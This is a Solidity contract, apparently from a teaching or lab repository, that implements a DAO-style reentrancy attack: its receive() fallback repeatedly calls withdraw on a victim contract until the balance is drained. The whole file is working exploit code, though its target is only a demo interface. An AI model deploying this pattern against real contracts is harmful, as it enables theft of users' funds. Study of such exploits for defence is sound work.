// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;
import "./interface/IDAOVictim.sol";

contract DAOAttacker {
    IDAOVictim victim;

    constructor(IDAOVictim victim_address) {
        victim = victim_address;
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw(address(this));
    }

    receive() external payable {
        // may be a better expression in if statement,
        // this version may lead to REVERT;
        if (address(victim).balance > 0.1 ether) {
            victim.withdraw(address(this));
        }
    }
}
